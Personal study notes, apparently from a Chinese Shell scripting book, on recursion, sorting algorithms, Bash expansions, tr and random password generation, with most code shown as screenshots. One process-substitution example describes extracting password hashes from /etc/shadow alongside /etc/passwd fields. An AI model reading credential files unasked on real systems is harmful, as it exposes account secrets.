
![image-20220321224422133](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224422133.png)

![image-20220321224430446](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224430446.png)

需要注意的是，因为递归函数会自己调用自己，如果不设置任何退出机制，就会变成死循环递归调用，所以一般都需要设置一个条件，当条件触发后就结束递归。另外一个需要注意的是，递归函数仅当递归结束后，之前启动的调用函数才会依次关闭，如果递归次数特别多，会有大量的函数被反复调用而不关闭，非常容易导致内存中的数据溢出，进而导致程序出错。上面的脚本随着计算数量的增大计算性能会降低，

如图4-9所示，如果想得到第五个斐波那契数，就需要将前面所有的斐波那契数重新计算一遍，所以在可使用循环解决的问题中应该尽量避免过多使用递归函数，在一些不需要递归计算的环境中可以考虑使用递归函数。

![image-20220321224504844](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224504844.png)

### 4.12 排序算法之冒泡排序

对数据进行分析时经常需要进行排序处理，比如按占用CPU的时间对进程排序、按出现的次数频率对数据排序、按大小对数据进行排序等。对数据的排序可用使用sort命令，也可尝试自己编写排序脚本，自定义排序算法。常见的排序算法有很多，如冒泡排序、插入排序、选择排序、快速排序、堆排序、归并排序、希尔排序、二叉树排序等。

冒泡排序是一种比较简单的排序算法。冒泡排序不断地比较相邻的两个数据的大小，根据大小进行排序（升序或降序），如果顺序不对则彼此交换位置，依此类推，当所有的数据都比较完成后，一定可以找出一个最大或最小的值。通过彼此交换位置慢慢把大的或小的数据浮现出来，就像气泡浮出水面一样，所以这种算法被称为“冒泡排序”。如图4-10所示是冒泡排序的流程图。假设有7个待排序的数字，我们进行完第一轮的6次比较后一定能得出一个最大值，第一个数值冒泡出来。同理，第二轮进行5次[插图]比较后一定可以获得剩余所有数字中的最大值。依此类推，进行6轮这样的比较后，所有数据会按从小到大的顺序排列。

![image-20220321224829904](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321224829904.png)

先写一个简单的6个数字排序的脚本，看看冒泡排序的代码如何实现。

![image-20220321225142242](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321225142242.png)

![image-20220321225149011](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321225149011.png)

下面通过冒泡算法编写一个根据当前系统所有进程所占物理内存大小的排序脚本。

![image-20220321231224267](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231224267.png)

![image-20220321231231617](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231231617.png)

![image-20220321231101939](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231101939.png)

![image-20220321231118097](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231118097.png)

![image-20220321231203498](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220321231203498.png)

### 4.13 排序算法之快速排序

快速排序简称快排，是在冒泡排序的基础上演变出来的算法。这种算法的主要思想是挑选一个基准数字，然后把所有比该数字大的数字放到该数字的一边，其他比该数字小的数字放到该数字的另一边，然后递归对该基准数字两边的所有数字做相同的比较排序，直到所有数字都变为有序数字。快速排序的效率取决于挑选的基准数字，如果基准数字是一个比较折中的数字，则基准数字两边就比较均衡，这样比较的次数就会大大减少。如果基准数字偏大或偏小，就会导致基准数字两边的数字个数不均衡，最终需要进行数字比较的次数依然很多。通常我们会选择第一个元素或最后一个元素作为基准数字。

下面一起看看如何使用Shell脚本实现快速排序算法。

![image-20220322121940248](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322121940248.png)

![image-20220322122023982](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322122023982.png)

### 4.14 排序算法之插入排序

插入排序顾名思义就是提取一个数字后，对已排序的数字从后往前依次比较，选择合适的位置插入。这种算法的优点是，任意一个数字可能不需要对比所有数字就可以找到合适的位置，当然最差的情况也有可能需要对比所有数字后才能确定合适的位置。

![image-20220322133840224](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322133840224.png)

![image-20220322133933793](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322133933793.png)

### 4.15 排序算法之计数排序

前面学习的算法中无论是冒泡排序还是快速排序都是基于比较进行排序的，还有一种特殊的排序算法是不需要进行比较的，名为计数排序。这种排序算法的核心思想就是多创建一个数组，用于统计待排序数组中每个元素出现的次数。该算法的核心理念如图4-14所示，2、1、2、7、3、8是需要排序的数字，这个数字序列中的最大值为8，需要额外创建一个计数数组count，该数组有9个下标，分别为count[0]～count[8], count数组中所有元素的初始值为0，接着用待排序数组的元素值，作为计数数组的下标进行自加运算。如第一个数为2，就执行count[2]++，第三个待排序的数还是2，就再执行count[2]++。依此类推，使用count数组统计所有待排序数字出现的次数。最终，根据count数组元素的值打印对应的下标即可，如count[0]的值是0，就不打印，count[1]的值是1就打印一次1,count[2]的值是2就打印两次2，所有下标打印完就完成了数字的排序工作。

写一个可以自动分析待排序数组的最大值，自动创建计数数组赋初始值，最终实现排序功能的完整代码案例。

![image-20220322135608861](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322135608861.png)

## 第5章 一大波脚本技巧正向你走来

### 5.1 Shell八大扩展功能之花括号

Shell脚本支持七种类型的扩展功能：花括号扩展（braceexpansion）、波浪号扩展（tilde expansion）、参数与变量替换（parameter and variable expansion）、命令替换（commandsubstitution）、算术扩展（arithmetic expansion）、单词切割（word splitting）和路径替换（pathname expansion）。这些扩展技巧在编写脚本时非常有用。

在Shell脚本中可以使用花括号对字符串进行扩展。我们可以在一对花括号中包含一组以分号分隔的字符串或者字符串序列组成一个字符串扩展，注意最终输出的结果以空格分隔。使用该扩展时花括号不可以被引号引用（单引号或双引号），在括号的数量必须是偶数个。

![image-20220322143320926](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322143320926.png)

字符串序列后面可以跟一个可选的步长整数，该步长的默认值为1或-1。

![image-20220322143429729](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322143429729.png)

使用花括号扩展时在花括号前面和后面都可以添加可选的字符串，且花括号扩展支持嵌套。

![image-20220322143616912](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322143616912.png)

注意：花括号内两个字符的中间不能有空格,不然会原符号输出

![image-20220322144007436](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322144007436.png)

上面例子看出来花括号支持嵌套。

但是有意思的是再嵌套内添加空格  则添加空格的那一层会原符号输出，其他层则继续套接

![image-20220322144706203](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322144706203.png)

![image-20220322145806912](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322145806912.png)

![image-20220322145926767](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322145926767.png)

利用扩展备份文件

![image-20220322150307819](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322150307819.png)

利用扩展重命名



### 5.2 Shell八大扩展功能之波浪号

波浪号在Shell脚本中默认代表当前用户的家目录，我们也可以在波浪号后面跟一个有效的账户登录名称，可以返回特定账户的家目录。但是，注意账户必须是系统中的有效账户。

![image-20220322150823012](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322150823012.png)

波浪号扩展中使用～+表示当前工作目录，～-则表示前一个工作目录。

![image-20220322151114669](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151114669.png)

### 5.3 Shell八大扩展功能之变量替换

在Shell脚本中我们会频繁地使用$对变量进行扩展替换，变量字符可以放到花括号中，这样可以防止需要扩展的变量字符与其他不需要扩展的字符混淆。如果$后面是位置变量且多于一个数字，必须使用{}，如$1、${11}、${12}。

![image-20220322151501424](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151501424.png)

如果变量字符串前面使用感叹号（!），可以实现对变量的间接引用，而不是返回变量本身的值。感叹号必须放在花括号里面，且仅能实现对变量的一层间接引用。

![image-20220322151628182](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151628182.png)

![image-20220322151832013](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151832013.png)



变量替换操作还可以测试变量是否存在及是否为空，若变量不存在或为空，则可以为变量设置一个默认值。Shell脚本支持多种形式的变量测试与替换功能，变量测试具体语法如下表

![image-20220322151908945](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322151908945.png)

变量animals未定义，因此使用echo返回变量的结果为空。

![image-20220322175611800](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322175611800.png)

根据变量替换的规则，当变量未定义或者变量定义了但是值为空时，返回关键字dog。但也仅仅返回关键字dog，不会因此改变animals的值，所以animals的值还是空。

![image-20220322175654422](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322175654422.png)

我们再通过示例验证一下即便定义了animals变量，但值为空时，依然会返回关键字。

![image-20220322175754540](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322175754540.png)

不管变量未定义还是变量的值为空，下面的示例都会返回关键字并且会修改变量的值。

![image-20220322180023387](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322180023387.png)

而当变量的值为非空时，这种扩展将直接返回变量自身的值。

![image-20220322180716419](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322180716419.png)

偶尔，我们还可以使用变量替换实现脚本的报错功能，判断一个变量是否有值，没有值或者值为空时就可以返回特定的报错信息。

![image-20220322181351511](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322181351511.png)

再看一个与前面相反的结果，当变量有值且非空时，返回关键字，而当变量没有定义或值为空时，则返回空。

![image-20220322181547984](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322181547984.png)

前面章节中我们已经编写了几个创建系统账户并配置密码的案例，结合这里我们学的变量替换功能，还可以继续对脚本进行优化，实现更多的功能。

![image-20220322183103520](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322183103520.png)

![image-20220322183144340](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322183144340.png)

变量的替换就这些吗？当然不是！变量替换还有非常实用的字符串切割与掐头去尾功能



字符串切割与掐头去尾具体语法

![image-20220322183946887](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322183946887.png)

这几种对变量的替换方式，都不会改变变量自身的值

首先定义一个变量home，变量的偏移量从0开始递增，分别表示变量值每个字符的位置。示例中变量home的具体位置偏移量如下图所示。

![image-20220322184903084](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322184903084.png)

![image-20220322185342707](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185342707.png)

从给定的位置偏移量开始对变量进行切割，如果设置了特定的长度，则截取给定长度的值后结束，如果没有指定截取的长度，则直接截取到变量的末尾。

![image-20220322185413332](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185413332.png)

从位置2开始截取到变量末尾

![image-20220322185446489](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185446489.png)

从位置14开始截取6个字符后结束

下面通过几个示例介绍对变量的掐头和去尾操作。使用#可以实现掐头，使用%可以实现去尾。

![image-20220322185951944](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322185951944.png)

从左往右将匹配的Th删除

![image-20220322190246150](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322190246150.png)

变量开头无法匹配oak，返回原值

![image-20220322190519260](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322190519260.png)

匹配y及其左边的所有内容删除

因为一个#表示最短匹配，所以执行上面的命令仅删除第一个y及其左边的所有内容。

如果需要做最长匹配，也就是一直找到最后一个指定的字符，并将该字符及其前面的所有字符全部删除就需要使用两个#符号。

![image-20220322191050138](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322191050138.png)

![image-20220322191339692](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322191339692.png)

从右往左删除efs

从右往左删除，直到匹配d为止。一个%从右往左匹配到第一个d即停止，两个%也会从右往左匹配，但是要匹配到最后一个d才会停止

![image-20220322192443561](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322192443561.png)

如果变量是数组类型的变量，这些扩展还有效吗？答案是肯定的，感慨Shell的强大！

![image-20220322193921151](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322193921151.png)

![image-20220322194446051](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322194446051.png)

根据数组的某个元素进行掐头操作

![image-20220322195007449](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322195007449.png)

![image-20220322195033237](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322195033237.png)

对数组的所有元素进行掐头



通过掐头去尾的方式可以实现对文件批量修改文件名或扩展名，下面是两个批量修改文件扩展名的案例。一个脚本是批量修改当前目录下的文件扩展名，另一个脚本是批量修改指定目录下的文件扩展名。

![image-20220322203049062](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322203049062.png)

![image-20220322204112395](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322204112395.png)

最后通过下表学习变量内容的统计与替换，通过这一组功能我们可以查找变量、统计变量内容的字符数及对变量内容进行替换操作。

变量内容的统计与替换

![image-20220322204144314](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322204144314.png)

![image-20220322204923110](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322204923110.png)

echo ${!x@}

echo ${!x*}列出已x开头的所有变量名

但是这两个也有差别

![image-20220322211455098](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322211455098.png)

![image-20220322211519485](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322211519485.png)



![image-20220322225541250](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322225541250.png)

输出数组所有下标

![image-20220322225625539](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322225625539.png)

declare定义关联数组

![image-20220322230024753](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322230024753.png)

echo ${#x}统计变量的长度

![image-20220322230243407](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322230243407.png)

echo ${#x} 默认统计x[0]的长度

![image-20220322230338912](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322230338912.png)

![image-20220322231305796](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322231305796.png)

 ${x/a/b}   将a替换为b  仅替换第一个a

![image-20220322231910490](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322231910490.png)

${x//a/b}   将全部a替换为b

![image-20220322232026037](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322232026037.png)

![image-20220322232152089](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322232152089.png)

变量替换不会修改变量的值

![image-20220322232637168](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322232637168.png)

${x^^}将所有字母替换为大写

![image-20220322232826186](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322232826186.png)

${x^}将首字母替换为大写

![image-20220322233040664](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322233040664.png)

${x^h}将第一个h替换为大写

![image-20220322233112884](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220322233112884.png)

${x^^h}将所有h替换为大写

![image-20220322233303849](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322233303849.png)

${x^^[heo]}将所有heo替换为大写

![image-20220322233510943](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322233510943.png)

小写方法如上

### 5.4 Shell八大扩展功能之命令替换

命令替换在1.5节有介绍，这里将其纳入替换扩展功能中再通过几个简单的示例复习一遍。我们可以通过$（命令）或者`命令`实现命令替换，推荐使用$（命令）这种方式，该方式支持嵌套的命令替换。

![image-20220322235903409](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220322235903409.png)

![image-20220323000037907](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323000037907.png)

![image-20220323000136247](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323000136247.png)

![image-20220323000427639](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323000427639.png)

### 5.5 Shell八大扩展功能之算术替换

通过算术替换扩展可以进行算术计算并返回计算结果，算术替换扩展的格式为$（（）），也可以使用$[]的形式，算术扩展支持嵌套。在1.8节中有具体介绍.这里再次通过简单的示例演示算术扩展的功能。

![image-20220323170300601](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323170300601.png)

![image-20220323171626362](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323171626362.png)

逻辑判断  1代表对  0代表错

### 5.6 Shell八大扩展功能之进程替换

命令替换将一个命令的输出结果返回并且赋值给变量，而进程替换则将进程的返回结果通过命名管道的方式传递给另一个进程。

进程替换的语法格式为：＜（命令）或者＞（命令）。一旦使用了进程替换功能，系统将会在/dev/fd/目录下创建文件描述符文件，通过该文件描述符将进程的输出结果传递给其他进程。

![image-20220323172528709](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323172528709.png)

通过匿名管道（|）我们可以将一个命令的输出结果传递给另一个进程作为其输入的内容，上面的示例中who | wc -l的目的就是通过匿名管道统计当前系统登录人数。相同的功能我们还可以使用进程替换的方式来实现。＜（who）会将who命令产生的结果保存到/dev/fd/63这个文件描述符中，并将该文件描述符作为wc -l命令的输入参数，最终wc -l ＜（who）的输出结果说明了在/dev/fd/63这个文件中包含1行内容。需要注意的是，文件描述符是实时动态生成的，所以当进程执行完毕，再使用ls查看该文件描述符时会提示没有该文件。

使用进程替换我们还可以将多个进程的输出结果传递给一个进程作为其输入参数。在下面的案例中我们希望提取/etc/passwd文件中的账户名称（第一列）和家目录（第六列），再提取/etc/shadow中的密码信息（第二列），最后通过paste命令将数据合并为一个文件信息，paste命令会逐行读取多个文件的内容并将多个文件合并。

![image-20220323173504832](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323173504832.png)

在Linux系统中可以使用管道将前一个命令的输出重定向到文件，但是一旦使用了重定向输出到文件，命令的输出结果将无法在屏幕上显示。

![image-20220323174209838](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323174209838.png)

![image-20220323174230966](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323174230966.png)

使用tee命令既可以把内容重定向到文件，同时可以在屏幕上显示输出结果。下面的命令可以查看/etc目录下所有以conf结尾的文件，并将输出结果保存到/tmp/conf.log文件中。注意：如果系统中该文件已存在，则tee命令会覆盖该文件原有的内容。

![image-20220323174318966](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323174318966.png)

接下来我们再结合tee命令演示一个进程替换的案例。我们会创建三个扩展名为sh的文件和三个扩展名为conf的文件作为实验素材，然后可以将ls|tee的输出结果通过进程替换写入临时的文件描述符，最后通过grep对文件描述符的内容进行过滤，将以sh结尾的文件名重定向输出到sh.log文件，将以conf结尾的文件名重定向到conf.log文件。

![image-20220323175451350](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323175451350.png)

![image-20220323175503654](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323175503654.png)

![image-20220323175515944](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323175515944.png)

### 5.7 Shell八大扩展功能之单词切割

单词切割也叫分词，Shell使用IFS[插图]变量进行分词处理，默认使用IFS变量的值作为分隔符，对输入数据进分词处理后再执行命令。如果没有自定义IFS，则默认值为空格、Tab制表符和换行符。

![image-20220323175945004](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323175945004.png)

![image-20220323180037529](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323180037529.png)

![image-20220323180323977](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323180323977.png)

### 5.8 Shell八大扩展功能之路径替换

除非使用set -f禁用路径替换，否则Bash会在路径和文件名中搜索*、？和[符号，如果找到了这些符号则进行模式匹配的替换，关于模式匹配与通配符在2.13节有详细讲解，Shell在处理命令时对路径替换后的路径或文件进行处理。

如果使用shopt命令时开启了nocaseglob选项，则Bash在进行模式匹配时不区分大小写，默认是区别大小写的。另外，还可以在使用shopt命令时开启extglob选项，可以让Bash支持扩展通配符。shopt命令的-s选项可以开启特定的Shell属性，-u选项可以关闭特定的Shell属性。

![image-20220323180927671](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323180927671.png)

shopt -s nocaseglob #设置shell属性不区分大小写

![image-20220323181151147](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323181151147.png)

![image-20220323181933269](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323181933269.png)

![image-20220323182004155](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323182004155.png)

![image-20220323182131017](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323182131017.png)

关于路径或文件名，除了可以使用Bash自动的路径扩展功能，使用basename和dirname这两个外部命令，还可以截取一个路径中的路径部分或者文件名部分的内容。、

![image-20220323182925583](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323182925583.png)

使用ls或者find命令列出文件时默认都是带路径的，而有些时候我们仅需要文件名即可，这时可以使用basename提取文件名。

![image-20220323183142422](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323183142422.png)

### 5.9 实战案例：生成随机密码的若干种方式

创建账户时我们需要配置初始随机密码，使用手机号注册时需要随机验证码，抽奖活动需要随机点名，俄罗斯方块游戏需要随机出形状。这些案例都在说明一个问题，随机数据很重要！而在Shell脚本中如果需要生成随机数据有哪些方式呢？下面我们依次看看都有哪些方式。

#### 1）使用字符串截取提取随机密码

![image-20220323191036684](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323191036684.png)

#### 2）使用命令生成随机数据

![image-20220323191539913](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323191539913.png)

uuidgen  #生成16进制随机字符串

![image-20220323191725802](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220323191725802.png)

利用openssl生成16进制随机字符串

![image-20220323191822000](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323191822000.png)

利用openssl的base64生成随机字符串

![image-20220323192059884](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323192059884.png)

![image-20220323192502502](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323192502502.png)

对明文加密生成随机字符串

因为是随机字符串所以可以看到每次都不一样

![image-20220323192556206](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323192556206.png)

1970-1-1到当前的秒数

![image-20220323192626018](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323192626018.png)

1970-1-1到当前的纳秒数

#### 3）使用设备文件生成随机数据

在Linux操作系统中默认提供了两个可以生成随机数据的设备文件：/dev/random和/dev/urandom。很多程序都会调用这些设备生成随机数据，比如SSH、GPG、Tomcat。/dev/random依赖于系统中断（Interrupt），因此当系统中断不足时该文件是无法提供足够的随机数据的，这样会导致需要使用random设备文件生成随机数据的程序阻塞。而/dev/urandom则不依赖于系统中断，在系统中断不足时也可以提供足够的随机数据。我们可以使用文本工具直接查看这两个文件，因为这两个文件可以提供无限的随机数据，所以需要使用Ctrl+C组合键才可以中断对这两个文件的查看。

[linux系统中断详解网站链接](https://www.cnblogs.com/badbear/p/15419938.html)

random设备文件生成随机数据的程序阻塞：

- ```
  - `/dev/random`适用于对随机数质量要求比较高的请求，在熵池中数据不足时， 读取`/dev/random`设备时会返回小于熵池噪声总数的随机字节。`/dev/random`可生成高随机性的公钥或一次性密码本。若熵池空了，对`/dev/random`的读操作将会被阻塞，直到收集到了足够的环境噪声为止。这样的设计使得`/dev/random`是真正的随机数发生器，提供了最大可能的随机数据熵。
  - `/dev/urandom`非阻塞的随机数发生器，它会重复使用熵池中的数据以产生伪随机数据。这表示对`/dev/urandom`的读取操作不会产生阻塞，但其输出的熵可能小于`/dev/random`的。它可以作为生成较低强度密码的伪随机数生成器，对大多数应用来说，随机性是可以接受的。
  ```

![image-20220323193215571](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323193215571.png)

cat /dev/random

![image-20220323193241050](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220323193241050.png)

strings /dev/random

![image-20220323193456760](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323193456760.png)

cat /dev/urandom

![image-20220323193426482](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323193426482.png)

strings /dev/urandom

random和urandom这两个设备提供的随机数据可能会包含特殊符号，而有些验证码需要是纯数字的，有时密码需要是字母、数字且不包括特殊符号等，所以我们需要使用tr对原始数据进行过滤。另外，这两个设备文件为我们提供无限的随机数据，但是我们需要的密码或密钥之类的数据是需要有限位数的，因此我们还需要使用工具截取特定长度的随机数据。



使用tr命令可以从标准输入读取数据并对其进行替换、删除等操作后再输出结果。

tr命令的常用选项

![image-20220323194135916](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323194135916.png)

![image-20220323200910514](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323200910514.png)

备注：数据集1是必需的，选项和数据集2是可选的。

tr命令最简单的应用就是统一大小写，我们可以使用tr命令将所有小写替换为大写，或者将大写替换为小写。

![image-20220323201252202](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323201252202.png)

将小写h转换为大写

![image-20220323201339722](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323201339722.png)

将h换成9

![image-20220323201614666](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323201614666.png)

将h换成x

![image-20220323201659774](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323201659774.png)

从标准输入读取数据然后再用tr转换

![image-20220323201810624](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323201810624.png)

删除连续的数字

![image-20220323201824784](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220323201824784.png)

非连续的a和b不会删除

![image-20220323202812422](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323202812422.png)

删除字母h

![image-20220323202834090](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220323202834090.png)

删除h和o

![image-20220323203135432](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323203135432.png)

这里tr命令使用了-c选项，该选项的作用是提取数据集1的差集，也就是取反。对字母o取反，就是提取字母o以外的所有集合，包括特殊符号和控制符号，如换行符和回车符等。而上面的命令使用-c选项对数据集1（字母o）取反后，还使用-d选项将取反以后的数据集合进行了删除操作。最终在输出了两个字母o后，没有输出换行而直接显示了命令行提示符（本来应该有的换行符也被删除了）。

![image-20220323203551254](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220323203551254.png)

![image-20220323203632982](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323203632982.png)

保留数字和换行符

![image-20220323203807518](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323203807518.png)

将数字外的符号全替换为x

![image-20220323203847826](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323203847826.png)

将小写字母外的符号全替换为x

回到提取随机验证码或密码的问题，我们可以将random或urandom设备文件提供的多余数据删除，仅保留我们需要的数据，然后结合head之类的工具截取有效位数的数据。

提取10位包含字母、数字和下画线的随机数据。

![image-20220323205344710](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323205344710.png)

![image-20220323205615053](C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220323205615053.png)

提取10位包含存数字的随机数据。

![image-20220323205716616](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220323205716616.png)



#### 4）通过Hash值生成随机数据

